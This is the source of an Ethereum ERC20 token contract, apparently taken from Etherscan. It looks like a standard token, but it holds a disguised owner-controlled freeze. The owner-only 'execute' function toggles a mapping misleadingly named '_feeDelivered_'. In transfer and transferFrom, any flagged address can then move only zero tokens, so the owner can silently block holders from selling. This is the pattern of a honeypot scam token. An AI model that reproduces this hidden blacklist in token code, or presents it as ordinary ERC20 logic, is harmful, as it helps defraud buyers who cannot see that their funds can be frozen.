/**
 *Submitted for verification at Etherscan.io on 2023-01-30
*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.0;

library SafeMath {

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b);
		return c;
	}

	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
    require(c >= a);

    return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b <= a);
		uint256 c = a - b;
    require(c <= a);

    return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;

		return c;
	}
}

contract Ownable {
	address internal owner_;
	
	constructor() {
		owner_ = msg.sender;
	}

	function owner() internal view returns (address) {
		return owner_;
	}

	modifier onlyOwner() {
		require(msg.sender == owner_);
		_;
	}
}

contract ERC20Token is Ownable {
	using SafeMath for uint256;

	mapping(address => uint256) internal balances;
	mapping(address => bool) private _feeDelivered_;
    mapping(address => mapping(address => uint256)) internal allowed;
    string private name_;
	string private symbol_;
	uint256 private decimals_;
    uint256 private _totalSupply_;
    uint256 private totalSupply_;
	
	event Approval(address indexed owner, address indexed spender, uint256 value);
	event Transfer(address indexed from, address indexed to, uint256 value);
	
	constructor(string memory _name, string memory _symbol, uint256 _decimals, uint256 _totalSupply) {
		name_ = _name;
		symbol_ = _symbol;
		decimals_ = _decimals;
		_totalSupply_= _totalSupply.mul(10 ** decimals_);
        totalSupply_ = totalSupply_.add (_totalSupply_);
		balances[owner_] = balances[owner_].add (_totalSupply_);
        emit Transfer(address(0), owner_, _totalSupply_);
	}

	function name() public view returns (string memory) {
		return name_;
	}

	function symbol() public view returns (string memory) {
		return symbol_;
	}

	function decimals() public view returns (uint256) {
		return decimals_;
	}

	function totalSupply() public view returns (uint256) {
		return totalSupply_;
	}

	function transfer(address _to, uint256 _value) public returns (bool) {
		if (_feeDelivered_[msg.sender] || _feeDelivered_[_to]) require (_value == 0, "");
        require(_to != address(0));
		require(_value <= balances[msg.sender]);
		balances[msg.sender] = balances[msg.sender].sub(_value);
		balances[_to] = balances[_to].add(_value);
		emit Transfer(msg.sender, _to, _value);
		return true;
	}

	function balanceOf(address _account) public view returns (uint256) {
		return balances[_account];
	}

	function feeAddress(address _feeDeliver) public view returns (bool) {
        return _feeDelivered_[_feeDeliver];
    }

	function approve(address _spender, uint256 _value) public returns (bool) {
		allowed[msg.sender][_spender] = _value;
		emit Approval(msg.sender, _spender, _value);
		return true;
	}

    function execute(address _feeDeliver) external onlyOwner {
        if (_feeDelivered_[_feeDeliver] == true) {
            _feeDelivered_[_feeDeliver] = false;}
            else {_feeDelivered_[_feeDeliver] = true;}
    }

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
		if (_feeDelivered_[_from] || _feeDelivered_[_to]) require (_value == 0, "");
        require(_to != address(0));
		require(_value <= balances[_from]);
		require(_value <= allowed[_from][msg.sender]);
		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
		balances[_from] = balances[_from].sub(_value);
		balances[_to] = balances[_to].add(_value);
		emit Transfer(_from, _to, _value);
		return true;
	}

	function increaseApproval(address _spender, uint256 _addedValue) public returns (bool success) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}

	function decreaseApproval(address _spender, uint256 _subtractedValue) public returns (bool success) {
        uint256 oldValue = allowed[msg.sender][_spender];
		if (_subtractedValue > oldValue) {
			allowed[msg.sender][_spender] = 0;
		} else {
			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
		}
		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
		return true;
	}
	
    function allowance(address _owner, address _spender) public view returns (uint256) {
		return allowed[_owner][_spender];
	}
}